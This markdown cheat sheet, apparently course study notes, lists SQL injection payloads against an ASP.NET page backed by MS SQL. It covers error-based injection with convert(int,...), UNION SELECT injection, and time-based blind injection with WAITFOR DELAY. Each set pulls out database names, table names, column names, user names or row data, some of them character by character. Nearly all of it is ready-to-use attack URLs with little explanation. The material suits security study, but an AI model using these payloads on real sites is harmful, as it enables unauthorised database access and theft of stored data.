#### **Perform Error Based SQL Injection**

**▪ Extract Database Name**
```
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(DB_NAME))--
```

**▪ Extract 1st Database Table**
```
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--
```

**▪ Extract 1st Table Column Name**
```
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--
```

**▪ Extract 1st Field of 1st Row (Data)**
```
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--
```

##### **Perform Union SQL Injection** 

**▪ Extract Database Name**
```
http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,DB_NAME,3,4--
```

**▪ Extract Database Tables**

```
http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--
```

**▪ Extract Table Column Names**
```
http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns where table_name ='EMPLOYEE_TABLE'--
```

**▪ Extract 1st Field Data**
```
http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME --
```

#### **Blind SQL Injection—Extract Database User** 

**▪ Example 1: Check for username length**
```
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
```

**▪ Example 2: Check if 1st character in the username contains ‘A’ (a=97), ‘B’, or ‘C’, and so on.**
```
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
```

**▪ Example 3: Check if 2nd second character in the username contains ‘A’ (a=97), ‘B’, or ‘C’, and so on.**
```
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),2,1)))=97) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),2,1)))=99) WAITFOR DELAY '00:00:10'--
```

#### **Blind SQL Injection—Extract Database Name** 

**▪ Example 1: Check for Database Name Length and Name**
```
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1;
IF(ASCII(lower(substring((DB_NAME()),1,1)))=97) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1;
IF(ASCII(lower(substring((DB_NAME()),2,1)))=98) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((DB_NAME()),3,1)))=99) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((DB_NAME()),4,1)))=100) WAITFOR DELAY '00:00:10'--
```

**▪ Example 2: Extract 1st Database Table**
```
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=3) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=101) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),2,1)))=109) WAITFOR DELAY '00:00:10'--

http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),3,1)))=112) WAITFOR DELAY '00:00:10'--Table 
```